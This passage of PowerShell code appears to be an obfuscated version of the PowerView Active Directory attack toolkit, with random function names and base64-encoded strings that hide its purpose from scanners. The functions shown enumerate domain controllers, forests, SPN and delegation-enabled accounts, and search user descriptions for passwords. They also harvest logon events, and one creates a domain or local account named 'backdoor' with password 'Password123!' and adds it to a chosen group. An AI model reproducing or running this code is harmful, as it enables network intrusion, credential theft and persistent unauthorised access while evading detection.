                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) $Name[1]
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFMASQBEAA=='))) $Name[0]
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAQwBvAG4AdAByAG8AbABUAHkAcABlAA=='))) $_.AccessControlType
                    $Out
                }
            }
        }
        catch {
            Write-Warning $_
        }
    }
}
function InfeerismAltersDitronite {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        $Object
    )
    process {
        if($Object) {
            if ( [bool]($Object.PSobject.Properties.name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))) ) {
                $Object.dnshostname
            }
            elseif ( [bool]($Object.PSobject.Properties.name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA=')))) ) {
                $Object.name
            }
            else {
                $Object
            }
        }
        else {
            return $Null
        }
    }
}
function HaleCiteOzoos {
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )
    $ObjectProperties = @{}
    $Properties.PropertyNames | % {
        if (($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAGQAaABpAHMAdABvAHIAeQA='))))) {
            $ObjectProperties[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value
        }
        elseif($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA=')))) {
            $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
        }
        elseif( ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAUABhAHMAcwB3AG8AcgBkAFQAaQBtAGUA')))) ) {
            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                $Temp = $Properties[$_][0]
                [Int32]$High = $Temp.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f $High, $Low)))
            }
            else {
                $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
            }
        }
        elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {
            $Prop = $Properties[$_]
            try {
                $Temp = $Prop[$_][0]
                Write-Verbose $_
                [Int32]$High = $Temp.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = [Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f $High, $Low)
            }
            catch {
                $ObjectProperties[$_] = $Prop[$_]
            }
        }
        elseif($Properties[$_].count -eq 1) {
            $ObjectProperties[$_] = $Properties[$_][0]
        }
        else {
            $ObjectProperties[$_] = $Properties[$_]
        }
    }
    New-Object -TypeName PSObject -Property $ObjectProperties
}
function SuprajesUnderAganger {
    [CmdletBinding()]
    param(
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [String]
        $ADSprefix,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    if(!$Domain) {
        $Domain = (PrectusEmbakedTects).name
    }
    else {
        if(!$DomainController) {
            try {
                $DomainController = ((PrectusEmbakedTects).PdcRoleOwner).Name
            }
            catch {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBEAG8AbQBhAGkAbgBTAGUAYQByAGMAaABlAHIAOgAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABQAEQAQwAgAGYAbwByACAAYwB1AHIAcgBlAG4AdAAgAGQAbwBtAGEAaQBuAA==')))
            }
        }
    }
    $SearchString = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwA=')))
    if($DomainController) {
        $SearchString += $DomainController + "/"
    }
    if($ADSprefix) {
        $SearchString += $ADSprefix + ","
    }
    if($ADSpath) {
        if($ADSpath -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBDADoALwAvACoA')))) {
            $DistinguishedName = $AdsPath
            $SearchString = ""
        }
        else {
            if($ADSpath -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAqAA==')))) {
                $ADSpath = $ADSpath.Substring(7)
            }
            $DistinguishedName = $ADSpath
        }
    }
    else {
        $DistinguishedName = ("DC={0}" -f $($Domain.Replace('.', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQA='))))))
    }
    $SearchString += $DistinguishedName
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBEAG8AbQBhAGkAbgBTAGUAYQByAGMAaABlAHIAIABzAGUAYQByAGMAaAAgAHMAdAByAGkAbgBnADoAIAAkAFMAZQBhAHIAYwBoAFMAdAByAGkAbgBnAA==')))
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $Searcher.PageSize = $PageSize
    $Searcher
}
function PrectusEmbakedTects {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain
    )
    process {
        if($Domain) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGQAbwBtAGEAaQBuACAAJABEAG8AbQBhAGkAbgAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAbwByACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0AC4A')))
                $Null
            }
        }
        else {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
    }
}
function NaeDampGrina {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest
    )
    process {
        if($Forest) {
            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), $Forest)
            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGYAbwByAGUAcwB0ACAAJABGAG8AcgBlAHMAdAAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAbwByACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0AC4A')))
                $Null
            }
        }
        else {
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if($ForestObject) {
            $ForestSid = (New-Object System.Security.Principal.NTAccount($ForestObject.RootDomain,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))))).Translate([System.Security.Principal.SecurityIdentifier]).Value
            $Parts = $ForestSid -Split "-"
            $ForestSid = $Parts[0..$($Parts.length-2)] -join "-"
            $ForestObject | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABEAG8AbQBhAGkAbgBTAGkAZAA='))) $ForestSid
            $ForestObject
        }
    }
}
function MegatedJuloInternate {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest,
        [String]
        $Domain
    )
    process {
        if($Domain) {
            if($Domain.Contains('*')) {
                (NaeDampGrina -Forest $Forest).Domains | ? {$_.Name -like $Domain}
            }
            else {
                (NaeDampGrina -Forest $Forest).Domains | ? {$_.Name.ToLower() -eq $Domain.ToLower()}
            }
        }
        else {
            $ForestObject = NaeDampGrina -Forest $Forest
            if($ForestObject) {
                $ForestObject.Domains
            }
        }
    }
}
function CherlikeCelerSubdefull {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest
    )
    process {
        $ForestObject = NaeDampGrina -Forest $Forest
        if($ForestObject) {
            $ForestObject.FindAllGlobalCatalogs()
        }
    }
}
function GookHyperifSes {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $LDAP
    )
    process {
        if($LDAP -or $DomainController) {
            GrochoniIncunnerMoustic -Domain $Domain -DomainController $DomainController -FullData -Filter '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
        }
        else {
            $FoundDomain = PrectusEmbakedTects -Domain $Domain
            if($FoundDomain) {
                $Founddomain.DomainControllers
            }
        }
    }
}
function BilinessArcallyBorn {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $UserName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [String]
        $Filter,
        [Switch]
        $SPN,
        [Switch]
        $AdminCount,
        [Switch]
        $Unconstrained,
        [Switch]
        $AllowDelegation,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $UserSearcher = SuprajesUnderAganger -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController -PageSize $PageSize
    }
    process {
        if($UserSearcher) {
            if($Unconstrained) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIAB1AG4AYwBvAG4AcwB0AHIAYQBpAG4AZQBkACAAZABlAGwAZQBnAGEAdABpAG8AbgA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADUAMgA0ADIAOAA4ACkA')))
            }
            if($AllowDelegation) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGMAYQBuACAAYgBlACAAZABlAGwAZQBnAGEAdABlAGQA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxADAANAA4ADUANwA0ACkAKQA=')))
            }
            if($AdminCount) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIABhAGQAbQBpAG4AQwBvAHUAbgB0AD0AMQA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
            }
            if($UserName) {
                $UserSearcher.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoAHMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQA9ACQAVQBzAGUAcgBOAGEAbQBlACkAJABGAGkAbAB0AGUAcgApAA==')))
            }
            elseif($SPN) {
                $UserSearcher.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoAHMAZQByAHYAaQBjAGUAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA9ACoAKQAkAEYAaQBsAHQAZQByACkA')))
            }
            else {
                $UserSearcher.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAkAEYAaQBsAHQAZQByACkA')))
            }
            $UserSearcher.FindAll() | ? {$_} | % {
                HaleCiteOzoos -Properties $_.Properties
            }
        }
    }
}
function IreseEntryJynomal {
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName = 'backdoor',
        [ValidateNotNullOrEmpty()]
        [String]
        $Password = 'Password123!',
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,
        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain
    )
    if ($Domain) {
        $DomainObject = PrectusEmbakedTects -Domain $Domain
        if(-not $DomainObject) {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAAZwByAGEAYgBiAGkAbgBnACAAJABEAG8AbQBhAGkAbgAgAG8AYgBqAGUAYwB0AA==')))
            return $Null
        }
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain), $DomainObject
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $Context
        $User.Name = $UserName
        $User.SamAccountName = $UserName
        $User.PasswordNotRequired = $False
        $User.SetPassword($Password)
        $User.Enabled = $True
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbgBnACAAdQBzAGUAcgAgACQAVQBzAGUAcgBOAGEAbQBlACAAdABvACAAdwBpAHQAaAAgAHAAYQBzAHMAdwBvAHIAZAAgACcAJABQAGEAcwBzAHcAbwByAGQAJwAgAGkAbgAgAGQAbwBtAGEAaQBuACAAJABEAG8AbQBhAGkAbgA=')))
        try {
            $User.Save()
            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGMAcgBlAGEAdABlAGQAIABpAG4AIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4A')))
        }
        catch {
            Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABVAHMAZQByACAAYQBsAHIAZQBhAGQAeQAgAGUAeABpAHMAdABzACEA')))
            return
        }
    }
    else {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbgBnACAAdQBzAGUAcgAgACQAVQBzAGUAcgBOAGEAbQBlACAAdABvACAAdwBpAHQAaAAgAHAAYQBzAHMAdwBvAHIAZAAgACcAJABQAGEAcwBzAHcAbwByAGQAJwAgAG8AbgAgACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))
        $ObjOu = [ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))
        $ObjUser = $ObjOu.Create($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))), $UserName)
        $ObjUser.SetPassword($Password)
        try {
            $Null = $ObjUser.SetInfo()
            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGMAcgBlAGEAdABlAGQAIABvAG4AIABoAG8AcwB0ACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA=')))
        }
        catch {
            Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABBAGMAYwBvAHUAbgB0ACAAYQBsAHIAZQBhAGQAeQAgAGUAeABpAHMAdABzACEA')))
            return
        }
    }
    if ($GroupName) {
        if ($Domain) {
            AngoUltoidUnway -UserName $UserName -GroupName $GroupName -Domain $Domain
            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGEAZABkAGUAZAAgAHQAbwAgAGcAcgBvAHUAcAAgACQARwByAG8AdQBwAE4AYQBtAGUAIABpAG4AIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4A')))
        }
        else {
            AngoUltoidUnway -UserName $UserName -GroupName $GroupName -ComputerName $ComputerName
            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGEAZABkAGUAZAAgAHQAbwAgAGcAcgBvAHUAcAAgACQARwByAG8AdQBwAE4AYQBtAGUAIABvAG4AIABoAG8AcwB0ACAAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA=')))
        }
    }
}
function AngoUltoidUnway {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,
        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName,
        [String]
        $Domain
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    if($ComputerName -and ($ComputerName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAYQBsAGgAbwBzAHQA'))))) {
        try {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAaQBuAGcAIAB1AHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIAB0AG8AIAAkAEcAcgBvAHUAcABOAGEAbQBlACAAbwBuACAAaABvAHMAdAAgACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))
            ([ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUALwAkAEcAcgBvAHUAcABOAGEAbQBlACwAZwByAG8AdQBwAA==')))).add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUALwAkAFUAcwBlAHIATgBhAG0AZQAsAHUAcwBlAHIA'))))
            $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGEAZABkAGUAZAAgAHQAbwAgAGcAcgBvAHUAcAAgACQARwByAG8AdQBwAE4AYQBtAGUAIABvAG4AIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAA==')))
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABFAHIAcgBvAHIAIABhAGQAZABpAG4AZwAgAHUAcwBlAHIAIAAkAFUAcwBlAHIATgBhAG0AZQAgAHQAbwAgAGcAcgBvAHUAcAAgACQARwByAG8AdQBwAE4AYQBtAGUAIABvAG4AIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAA==')))
            return
        }
    }
    else {
        try {
            if ($Domain) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAaQBuAGcAIAB1AHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIAB0AG8AIAAkAEcAcgBvAHUAcABOAGEAbQBlACAAbwBuACAAZABvAG0AYQBpAG4AIAAkAEQAbwBtAGEAaQBuAA==')))
                $CT = [System.DirectoryServices.AccountManagement.ContextType]::Domain
                $DomainObject = PrectusEmbakedTects -Domain $Domain
                if(-not $DomainObject) {
                    return $Null
                }
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $CT, $DomainObject            
            }
            else {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAaQBuAGcAIAB1AHMAZQByACAAJABVAHMAZQByAE4AYQBtAGUAIAB0AG8AIAAkAEcAcgBvAHUAcABOAGEAbQBlACAAbwBuACAAbABvAGMAYQBsAGgAbwBzAHQA')))
                $Context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, $Env:ComputerName)
            }
            $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($Context,$GroupName)
            $Group.Members.add($Context, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)
            $Group.Save()
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYQBkAGQAaQBuAGcAIAAkAFUAcwBlAHIATgBhAG0AZQAgAHQAbwAgACQARwByAG8AdQBwAE4AYQBtAGUAIAA6ACAAJABfAA==')))
        }
    }
}
function AnaryAntsPossa {
    [CmdletBinding()]
    param(
        [String[]]
        $Properties,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    if($Properties) {
        $Properties = ,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))) + $Properties
        BilinessArcallyBorn -Domain $Domain -DomainController $DomainController -PageSize $PageSize | select -Property $Properties
    }
    else {
        BilinessArcallyBorn -Domain $Domain -DomainController $DomainController -PageSize $PageSize | select -First 1 | gm -MemberType *Property | select -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))
    }
}
function PhrangingConsNotypiest {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $SearchTerm = 'pass',
        [String]
        $SearchField = 'description',
        [String]
        $ADSpath,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    process {
        BilinessArcallyBorn -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Filter $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAkAFMAZQBhAHIAYwBoAEYAaQBlAGwAZAA9ACoAJABTAGUAYQByAGMAaABUAGUAcgBtACoAKQA='))) -PageSize $PageSize | select samaccountname,$SearchField
    }
}
function DruinousSubfulleUnhumpts {
    Param(
        [String]
        $ComputerName = $Env:ComputerName,
        [String]
        [ValidateSet("logon","tgt","all")]
        $EventType = "logon",
        [DateTime]
        $DateStart=[DateTime]::Today.AddDays(-5)
    )
    if($EventType.ToLower() -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAA==')))) {
        [Int32[]]$ID = @(4624)
    }
    elseif($EventType.ToLower() -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABnAHQA')))) {
        [Int32[]]$ID = @(4768)
    }
    else {
        [Int32[]]$ID = @(4624, 4768)
    }
    Get-WinEvent -ComputerName $ComputerName -FilterHashTable @{ LogName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA=='))); ID=$ID; StartTime=$DateStart} -ErrorAction SilentlyContinue | % {
        if($ID -contains 4624) {    
            if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AEwAbwBnAG8AbgAgAFQAeQBwAGUAOgApAC4AKgA/ACgAPwA9ACgASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgAgAEwAZQB2AGUAbAA6AHwATgBlAHcAIABMAG8AZwBvAG4AOgApACkA')))) {
                if($Matches) {
                    $LogonType = $Matches[0].trim()
                    $Matches = $Null
                }
            }
            else {
                $LogonType = ""
            }
            if (($LogonType -eq 2) -or ($LogonType -eq 3)) {
                try {
                    if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AE4AZQB3ACAATABvAGcAbwBuADoAKQAuACoAPwAoAD8APQBQAHIAbwBjAGUAcwBzACAASQBuAGYAbwByAG0AYQB0AGkAbwBuADoAKQA=')))) {
                        if($Matches) {
                            $UserName = $Matches[0].split("" + "`n" + "")[2].split(":")[1].trim()
                            $Domain = $Matches[0].split("" + "`n" + "")[3].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }
                    if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AE4AZQB0AHcAbwByAGsAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAC4AKgA/ACgAPwA9AFMAbwB1AHIAYwBlACAAUABvAHIAdAA6ACkA')))) {
                        if($Matches) {
                            $Address = $Matches[0].split("" + "`n" + "")[2].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }
                    if ($UserName -and (-not $UserName.endsWith('$')) -and ($UserName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBOAE8ATgBZAE0ATwBVAFMAIABMAE8ARwBPAE4A'))))) {
                        $LogonEventProperties = @{
                            'Domain' = $Domain
                            'ComputerName' = $ComputerName
                            'Username' = $UserName
                            'Address' = $Address
                            'ID' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA2ADIANAA=')))
                            'LogonType' = $LogonType
                            'Time' = $_.TimeCreated
                        }
                        New-Object -TypeName PSObject -Property $LogonEventProperties
                    }
                }
                catch {
                    Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcABhAHIAcwBpAG4AZwAgAGUAdgBlAG4AdAAgAGwAbwBnAHMAOgAgACQAXwA=')))
                }
            }
        }
        if($ID -contains 4768) {
            try {
